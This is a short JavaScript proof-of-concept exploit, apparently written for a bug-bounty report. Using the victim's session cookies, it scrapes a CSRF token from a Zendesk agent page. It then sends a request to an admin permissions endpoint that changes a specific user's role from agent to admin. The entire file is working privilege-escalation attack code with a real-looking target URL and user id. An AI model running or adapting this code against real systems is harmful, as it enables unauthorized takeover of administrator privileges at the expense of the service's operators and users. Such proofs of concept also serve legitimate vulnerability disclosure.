async function sendPostRequest(urlexploit, data, urlToken) {
  try {
    // Step 1: Fetch the CSRF token from the server response
    const csrfResponse = await fetch(urlToken, {
      method: 'GET',
      credentials: 'include' // Include cookies in the request
    });
    
    const csrfText = await csrfResponse.text();

    // Step 2: Extract the CSRF token using a regular expression
    const csrfMatch = csrfText.match(/<meta name="csrf-token" content="(.+?)"/);
    if (!csrfMatch) {
      throw new Error('CSRF token not found in the response');
    }
    const csrfToken = csrfMatch[1]; // Correct group for token

    // Step 3: Send the POST request with the CSRF token and cookies
    const postResponse = await fetch(urlexploit, {
      method: 'post',
      credentials: 'include', // Include cookies in the request
      headers: {
        'Content-Type': 'application/json',
        'X-Csrf-Token': csrfToken
      },
      body: data
    });

    const postResult = await postResponse.json();
    console.log('Post response:', postResult);
  } catch (error) {
    console.error('Error:', error);
  }
}
//  urlToken
const urlToken = 'https://h1--1.zendesk.com/agent';
//  urlexploit
const urlexploit = 'https://h1--1.zendesk.com/api/admin/private/permissions/update_user_many';
//chnage agent to admin 
const data = '{"ids":[20310459109266],"role_type":5}';
sendPostRequest(urlexploit, data, urlToken);
